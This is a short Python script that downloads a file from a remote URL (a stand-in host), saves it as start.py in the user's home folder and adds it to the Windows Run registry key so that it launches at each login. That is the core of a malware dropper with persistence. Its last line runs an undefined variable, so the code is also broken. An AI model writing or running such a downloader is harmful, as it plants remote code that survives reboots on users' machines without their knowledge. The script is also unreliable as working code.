import os, requests, subprocess, winreg
def persist(name, target):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, target)
url = 'https://example.invalid/start.py'
response = requests.get(url)
path = os.path.join(os.path.expanduser('~'), 'start.py')
with open(path, 'w') as f:
    f.write(response.text)
persist('start', path)
subprocess.run(['python', other])
